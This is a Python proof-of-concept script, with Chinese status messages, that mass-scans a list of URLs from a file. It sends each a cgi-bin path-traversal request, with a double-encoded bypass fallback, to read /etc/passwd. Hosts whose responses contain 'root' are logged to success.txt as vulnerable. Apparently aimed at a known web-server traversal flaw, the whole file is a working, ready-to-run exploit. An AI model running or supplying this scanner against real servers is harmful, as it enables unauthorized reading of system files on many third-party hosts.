from urllib import request

def url_format(url):
    url = url.strip()
    if "https://" not in url and "http://" not in url:
        url = "https://"+url
    if url.endswith('/'):
        return url
    else:
        return(url+'/')

def write2file(success_url):
    with open('success.txt','a+') as result_file:
        result_file.write(success_url+'\n')
        
if __name__ == "__main__":
    try:
        file_name = 'url.txt'
    except:
        print("请输入文件名，例如：python poc.py url.txt")
        exit(0)
        
    flag = "root"
    payload = "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    payload_bypass = "cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
    with open(file_name) as url_file:
        urls = url_file.readlines()
        for url in urls:
            url = url_format(url)
            poc_url = url+payload
            poc_header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                }
            try:
                req = request.Request(poc_url, headers=poc_header,method='GET')
                response = request.urlopen(req)
                req_content = str(response.read())
                # print(req_content)
                if(flag in req_content):
                    print('[+]'+url+"存在漏洞")
                    write2file(url)
            except:
                try:
                    poc_url_bypass = url+payload_bypass
                    req_bypass = request.Request(poc_url_bypass, headers=poc_header,method='GET')
                    response_bypass = request.urlopen(req_bypass)
                    req_content_bypass = str(response_bypass.read())
                    if(flag in req_content_bypass):
                        print('[+]'+url+"存在漏洞")
                        write2file(url)
                except:
                    print('[—]'+url+"安全")


